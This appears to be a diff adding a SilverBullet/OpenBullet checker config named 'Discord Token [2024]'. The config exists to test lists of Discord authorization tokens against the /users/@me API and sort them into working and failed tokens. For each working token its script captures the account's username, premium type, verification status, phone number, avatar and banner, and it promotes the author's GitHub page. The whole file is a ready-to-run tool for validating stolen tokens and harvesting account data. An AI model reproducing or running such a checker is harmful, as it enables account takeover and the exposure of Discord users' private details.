@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "Discord Token",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-06-16T23:04:18.0553413+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Aneek",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Star https://github.com/aneekirfan",
+      "VariableName": "",
+      "Id": 1978546065
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Discord Token [2024]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#getAuth REQUEST GET "https://discordapp.com/api/v8/users/@me" 
+  
+  HEADER "authorization: <USER>" 
+
+#authLogin KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "username" 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+
+#parseUser PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+#parsePremium PARSE "<SOURCE>" JSON "premium_type" CreateEmpty=FALSE -> CAP "Type" 
+
+#parseVerified PARSE "<SOURCE>" JSON "verified" CreateEmpty=FALSE -> CAP "Verified" 
+
+#parsePhone PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Phone" 
+
+#parseAvatar PARSE "<SOURCE>" JSON "avatar_decoration_dat" -> CAP "Avatar" 
+
+#parseBanner PARSE "<SOURCE>" JSON "banner" -> CAP "Banner" 
+
+#verified KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Verified>" EqualTo "False" 
+
+#promotion FUNCTION Constant "https://github.com/aneekirfan" -> CAP "Channel" 
+
